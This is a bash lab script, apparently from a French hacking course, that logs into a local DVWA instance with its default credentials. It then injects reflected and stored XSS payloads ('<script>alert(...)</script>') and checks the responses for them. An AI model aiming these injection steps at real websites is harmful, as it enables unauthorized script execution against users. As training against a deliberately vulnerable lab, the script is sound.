#!/bin/bash
# =====================================================================
# lab_xss.sh — Reflected & Stored XSS sur DVWA
# =====================================================================
set -uo pipefail
source /tmp/techniques-hacking-mdj/env.sh

DVWA="http://localhost:$DVWA_PORT"
COOKIES=$(mktemp)
CURL="curl -s --connect-timeout 5 --max-time 10"

cleanup() { rm -f "$COOKIES"; }
trap cleanup EXIT

# Login
TOKEN=$($CURL -c "$COOKIES" "http://localhost:$DVWA_PORT/login.php" | grep -oP "user_token' value='\K[a-f0-9]+")
$CURL -c "$COOKIES" -b "$COOKIES" -X POST "http://localhost:$DVWA_PORT/login.php" \
  -d "username=admin&password=password&user_token=$TOKEN&Login=Login" -o /dev/null

echo ""
echo "=== 1. REFLECTED XSS ==="
echo "[*] Payload: <script>alert(1)</script>"
RESULT=$($CURL -c "$COOKIES" -b "$COOKIES" "http://localhost:$DVWA_PORT/vulnerabilities/xss_r/?name=<script>alert(1)</script>")
if echo "$RESULT" | grep -q "alert(1)"; then
  echo "[+] XSS REFLECTED: payload present dans la réponse"
else
  echo "[-] XSS non détecté (vérifier security level)"
fi

echo ""
echo "=== 2. STORED XSS ==="
echo "[*] Payload: <script>alert('StoredXSS')</script>"
$CURL -c "$COOKIES" -b "$COOKIES" -X POST "http://localhost:$DVWA_PORT/vulnerabilities/xss_s/" \
  -d "txtName=test&mtxMessage=<script>alert('StoredXSS')</script>&btnSign=Sign+Guestbook" -o /dev/null
RESULT=$($CURL -c "$COOKIES" -b "$COOKIES" "http://localhost:$DVWA_PORT/vulnerabilities/xss_s/")
if echo "$RESULT" | grep -q "StoredXSS"; then
  echo "[+] XSS STORED: payload stocké et affiché"
else
  echo "[-] Stored XSS non détecté"
fi
